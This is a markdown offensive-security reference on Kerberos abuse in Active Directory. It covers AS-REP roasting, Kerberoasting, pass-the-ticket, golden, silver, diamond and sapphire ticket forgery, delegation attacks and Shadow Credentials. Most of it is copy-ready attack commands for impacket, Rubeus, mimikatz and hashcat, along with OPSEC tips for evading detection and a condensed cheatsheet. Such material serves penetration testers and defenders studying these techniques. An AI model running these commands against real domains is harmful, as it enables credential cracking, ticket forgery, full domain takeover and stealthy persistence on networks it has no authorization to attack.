# Kerberos Attacks

Deep reference for Kerberos abuse in Active Directory: AS-REP roasting, Kerberoasting, Pass-the-Ticket / Overpass-the-Hash, Golden/Silver/Diamond/Sapphire tickets, and delegation attacks (unconstrained, constrained, RBCD) plus Shadow Credentials. Companion to `ad-enumeration-and-attacks.md`.

> 2025 reality check: Microsoft is **deprecating RC4 (etype 0x17)** for Kerberos in Windows 11 24H2 / Server 2025. Tools historically forced RC4 (easy to crack, mode 13100/18200). AES-only environments yield AES tickets (hashcat `19600/19700/19800/19900`) which are far slower to crack and require recent tool support. Forcing RC4 is also a strong detection signal (etype downgrade).

---

## 1. AS-REP Roasting (no credentials required if you have a user list)

Targets accounts with **"Do not require Kerberos pre-authentication"** (`DONT_REQ_PREAUTH`, UAC `0x400000`). The KDC returns an AS-REP whose encrypted portion is derived from the user's password → crack offline.

### Find & request
```bash
# No creds (just a user list) — RC4 by default
impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass -format hashcat -outputfile asrep.txt

# With creds (queries LDAP for DONT_REQ_PREAUTH automatically)
impacket-GetNPUsers domain.local/user:pass -request -format hashcat -outputfile asrep.txt
nxc ldap <DC_IP> -u user -p pass --asreproast asrep.txt
```
```powershell
# Rubeus (on-host)
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
Rubeus.exe asreproast /user:victim /format:hashcat        # single user
```

### Crack
```bash
hashcat -m 18200 asrep.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule   # RC4
hashcat -m 19900 asrep.txt rockyou.txt                                            # AES256 AS-REP (newer)
john --format=krb5asrep --wordlist=rockyou.txt asrep.txt
```

### Targeted AS-REP (if you have GenericWrite on a victim)
```powershell
# Toggle DONT_REQ_PREAUTH on a user you can write, roast, then revert
Set-DomainObject -Identity victim -XOR @{useraccountcontrol=4194304}
Rubeus.exe asreproast /user:victim /format:hashcat
Set-DomainObject -Identity victim -XOR @{useraccountcontrol=4194304}   # revert
```

---

## 2. Kerberoasting (needs any valid domain creds)

Any authenticated user can request a TGS for any account with a registered **SPN**. The TGS is encrypted with the service account's password key → crack offline. Service accounts often have weak, non-expiring passwords.

### Find & request
```bash
impacket-GetUserSPNs domain.local/user:pass -dc-ip <DC_IP>                       # list SPNs only
impacket-GetUserSPNs domain.local/user:pass -dc-ip <DC_IP> -request -outputfile kerb.txt
impacket-GetUserSPNs domain.local/user:pass -dc-ip <DC_IP> -request-user svc_sql -outputfile kerb.txt
nxc ldap <DC_IP> -u user -p pass --kerberoasting kerb.txt
```
```powershell
# Rubeus — /rc4opsec only roasts accounts that still allow RC4 (avoids AES noise)
Rubeus.exe kerberoast /format:hashcat /outfile:kerb.txt
Rubeus.exe kerberoast /rc4opsec /outfile:kerb.txt          # OPSEC: skip AES-only accounts
Rubeus.exe kerberoast /user:svc_sql /format:hashcat
Rubeus.exe kerberoast /stats                                # enumerate without requesting (stealthy)
```

### Crack
```bash
hashcat -m 13100 kerb.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule    # RC4 TGS
hashcat -m 19600 kerb.txt rockyou.txt                                             # AES128 TGS
hashcat -m 19700 kerb.txt rockyou.txt                                             # AES256 TGS
john --format=krb5tgs --wordlist=rockyou.txt kerb.txt
```

### Targeted Kerberoast (GenericWrite on a user → set a temporary SPN)
```powershell
Set-DomainObject -Identity victim -Set @{serviceprincipalname='fake/svc'}
Rubeus.exe kerberoast /user:victim /format:hashcat
Set-DomainObject -Identity victim -Clear serviceprincipalname     # revert
```
Impacket targeted variant:
```bash
impacket-targetedKerberoast -v -d domain.local -u attacker -p pass --dc-ip <DC_IP>
```

---

## 3. Pass-the-Ticket (PtT) & Overpass-the-Hash (OPtH)

### Request / use TGTs and STs
```bash
# Get a TGT from a password / hash / aesKey
impacket-getTGT domain.local/user:pass
impacket-getTGT -hashes :<NTLM> domain.local/user                   # overpass-the-hash
impacket-getTGT -aesKey <AES256> domain.local/user                  # pass-the-key (RC4-free, stealthier)
export KRB5CCNAME=user.ccache
impacket-psexec -k -no-pass domain.local/user@target.fqdn          # use the ticket

# Get a service ticket directly
impacket-getST -spn cifs/target.fqdn domain.local/user:pass
```
```powershell
# Rubeus
Rubeus.exe asktgt /user:user /rc4:<NTLM> /ptt                       # OPtH, inject TGT
Rubeus.exe asktgt /user:user /aes256:<KEY> /ptt                     # pass-the-key
Rubeus.exe ptt /ticket:base64orfile                                 # inject an existing ticket
Rubeus.exe dump                                                      # dump tickets from LSASS (admin)
Rubeus.exe triage                                                    # list cached tickets
```

### Ticket conversion
```bash
impacket-ticketConverter ticket.kirbi ticket.ccache       # kirbi (Windows) ↔ ccache (Linux)
impacket-ticketConverter ticket.ccache ticket.kirbi
```

---

## 4. Golden, Silver, Diamond & Sapphire Tickets

### 4.1 Golden Ticket (forge a TGT with the krbtgt key)
Requires the **krbtgt** hash (from DCSync) and the domain SID → full domain access, survives password changes of users (but not krbtgt).
```bash
impacket-secretsdump domain.local/da:pass@<DC_IP> -just-dc-user krbtgt   # get krbtgt NT/AES
impacket-ticketer -nthash <KRBTGT_NT> -domain-sid <DOMAIN_SID> -domain domain.local Administrator
# OPSEC: prefer AES so the ticket isn't RC4
impacket-ticketer -aesKey <KRBTGT_AES256> -domain-sid <SID> -domain domain.local Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass domain.local/Administrator@dc01.domain.local
```
```powershell
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:<SID> /krbtgt:<NT> /ptt
Rubeus.exe golden /rc4:<KRBTGT_NT> /domain:domain.local /sid:<SID> /user:Administrator /ptt
```

### 4.2 Silver Ticket (forge a TGS for one service)
Requires the **service account** (or computer `$`) hash only → access that one service; never touches the DC (stealthy).
```bash
impacket-ticketer -nthash <SERVICE_NT> -domain-sid <SID> -domain domain.local -spn cifs/host.domain.local Administrator
```
```powershell
Rubeus.exe silver /service:cifs/host.domain.local /rc4:<MACHINE_NT> /sid:<SID> /user:Administrator /ptt
```

### 4.3 Diamond & Sapphire Tickets (stealthier than golden)
A **Diamond ticket** modifies a *real* TGT's PAC (request a legit TGT, decrypt with krbtgt key, edit PAC, re-encrypt) so it blends with normal traffic. A **Sapphire ticket** embeds a real privileged user's PAC (via S4U2self) into the forged ticket — defeats PAC-anomaly detections.
```bash
impacket-ticketer -nthash <KRBTGT_NT> -domain-sid <SID> -domain domain.local \
  -request -user lowuser -password pass Administrator           # diamond-style (real PAC base)
# Sapphire: ticketer supports -impersonate for S4U-sourced PAC in recent versions
```
```powershell
Rubeus.exe diamond /krbkey:<KRBTGT_AES> /user:lowuser /password:pass /enctype:aes /ticketuser:Administrator /ptt
```

---

## 5. Delegation Attacks

### 5.1 Unconstrained Delegation
A host with unconstrained delegation caches the **TGT of any user who authenticates to it**. Compromise it, coerce a DC/admin to authenticate, extract their TGT.
```powershell
Get-DomainComputer -Unconstrained | select dnshostname            # find them
Rubeus.exe monitor /interval:5 /nowrap                            # watch for incoming TGTs
# Coerce a DC to auth to your unconstrained host (PrinterBug/PetitPotam) → capture DC$ TGT:
```
```bash
python3 dementor.py <unconstrained_host> <DC> -u user -p pass -d domain.local   # PrinterBug
# Then Rubeus dumps the DC$ TGT → DCSync.
```

### 5.2 Constrained Delegation (S4U)
An account `msDS-AllowedToDelegateTo` a service can impersonate **any** user to that service (S4U2self + S4U2proxy). If you control such an account:
```bash
impacket-findDelegation domain.local/user:pass -dc-ip <DC_IP>     # discover
impacket-getST -spn cifs/target.domain.local -impersonate Administrator domain.local/svc:pass
impacket-getST -spn cifs/target.domain.local -impersonate Administrator -hashes :<NT> domain.local/svc
export KRB5CCNAME=Administrator@cifs_target...ccache
impacket-psexec -k -no-pass domain.local/Administrator@target.domain.local
```
> Protocol-transition + the "alternate service" trick: a TGS for `cifs/host` can be retargeted to other SPNs on the same host (`host/`, `ldap/`, `http/`) since the service name isn't validated in the encrypted part.

### 5.3 Resource-Based Constrained Delegation (RBCD)
If you can **write** `msDS-AllowedToActOnBehalfOfOtherIdentity` on a target computer (e.g. you have GenericWrite/GenericAll on it), set an attacker-controlled principal there, then S4U to impersonate any user to that target. Needs a principal with an SPN — create a machine account via MachineAccountQuota.
```bash
# 1. Create an attacker machine account (default MAQ=10 lets any user do this)
impacket-addcomputer domain.local/user:pass -computer-name 'EVIL$' -computer-pass 'Passw0rd!' -dc-ip <DC_IP>
# 2. Write RBCD on the target
impacket-rbcd -delegate-from 'EVIL$' -delegate-to 'TARGET$' -action write domain.local/user:pass -dc-ip <DC_IP>
# 3. S4U to impersonate Administrator to the target
impacket-getST -spn cifs/target.domain.local -impersonate Administrator 'domain.local/EVIL$:Passw0rd!' -dc-ip <DC_IP>
export KRB5CCNAME='Administrator@cifs_target.domain.local@DOMAIN.LOCAL.ccache'
impacket-psexec -k -no-pass domain.local/Administrator@target.domain.local
```
```powershell
# Windows equivalent: Powermad (new machine) + PowerView (set attribute) + Rubeus s4u
New-MachineAccount -MachineAccount EVIL -Password (ConvertTo-SecureString 'Passw0rd!' -AsPlainText -Force)
$sid = (Get-DomainComputer EVIL).objectsid
Set-DomainObject -Identity TARGET$ -Set @{'msds-allowedtoactonbehalfofotheridentity'=<sec_descriptor_bytes>}
Rubeus.exe s4u /user:EVIL$ /rc4:<EVIL_NT> /impersonateuser:Administrator /msdsspn:cifs/target /ptt
```

---

## 6. Shadow Credentials (msDS-KeyCredentialLink)

If you can write `msDS-KeyCredentialLink` on a target (GenericWrite/GenericAll), add an attacker key-credential, then PKINIT-auth as the target to get its TGT/NT hash — no password reset, more stealth, easily reverted. Requires DFL 2016+ and a DC with PKINIT (CA) — extremely common.
```bash
# pyWhisker (Linux)
pywhisker -d domain.local -u attacker -p pass --target 'victim' --action add
# -> outputs a .pfx + password; then PKINIT:
certipy auth -pfx victim.pfx -dc-ip <DC_IP>            # returns TGT + NT hash
# or:
gettgtpkinit.py -cert-pfx victim.pfx -pfx-pass <pw> domain.local/victim victim.ccache
```
```powershell
# Whisker (Windows)
Whisker.exe add /target:victim
Rubeus.exe asktgt /user:victim /certificate:<b64> /password:<pw> /ptt
Whisker.exe remove /target:victim /deviceid:<id>      # cleanup
```
nxc one-shot:
```bash
nxc ldap <DC_IP> -u attacker -p pass -M shadowcred -o ACTION=add TARGET=victim
```

---

## 7. Cheatsheet

```bash
# AS-REP
impacket-GetNPUsers dom/ -usersfile users.txt -no-pass -format hashcat -o a.txt
hashcat -m 18200 a.txt rockyou.txt

# KERBEROAST
impacket-GetUserSPNs dom/u:p -dc-ip <DC> -request -o k.txt
hashcat -m 13100 k.txt rockyou.txt           # RC4 ;  -m 19700 for AES256

# PtT / OPtH
impacket-getTGT -hashes :<NT> dom/u; export KRB5CCNAME=u.ccache; impacket-psexec -k -no-pass dom/u@host.fqdn

# GOLDEN (need krbtgt)
impacket-secretsdump dom/da:p@<DC> -just-dc-user krbtgt
impacket-ticketer -aesKey <KRBTGT_AES> -domain-sid <SID> -domain dom Administrator

# RBCD
impacket-addcomputer dom/u:p -computer-name EVIL$ -computer-pass Pw! -dc-ip <DC>
impacket-rbcd -delegate-from EVIL$ -delegate-to TARGET$ -action write dom/u:p -dc-ip <DC>
impacket-getST -spn cifs/target.fqdn -impersonate Administrator 'dom/EVIL$:Pw!' -dc-ip <DC>

# SHADOW CREDS
pywhisker -d dom -u u -p p --target victim --action add
certipy auth -pfx victim.pfx -dc-ip <DC>
```

| Hashcat mode | Ticket type |
|--------------|-------------|
| 18200 | AS-REP (RC4) |
| 19900 | AS-REP (AES256) |
| 13100 | TGS-REP / Kerberoast (RC4) |
| 19600 / 19700 | TGS-REP Kerberoast (AES128 / AES256) |

---

## References

- The Hacker Recipes – Kerberos — https://www.thehacker.recipes/ad/movement/kerberos/
- HackTricks – Kerberoast / AS-REP / Tickets — https://book.hacktricks.xyz/windows-hardening/active-directory-methodology
- Rubeus — https://github.com/GhostPack/Rubeus
- Roasting AES AS-REPs (MWR) — https://mwrcybersec.com/roasting-aes-as-reps
- Intrinsec – Kerberos OPSEC (AS-REP/Kerberoast detection) — https://www.intrinsec.com/en/kerberos_opsec_part_2_as_rep-roasting/
- Shadow Credentials (pyWhisker/Whisker) — https://github.com/ShutdownRepo/pywhisker , https://github.com/eladshamir/Whisker
- RBCD (Elad Shamir – Wagging the Dog) — https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html
- Diamond/Sapphire tickets (Semperis/Trustedsec) — https://www.semperis.com/blog/new-attack-paths-as-requested-sts/
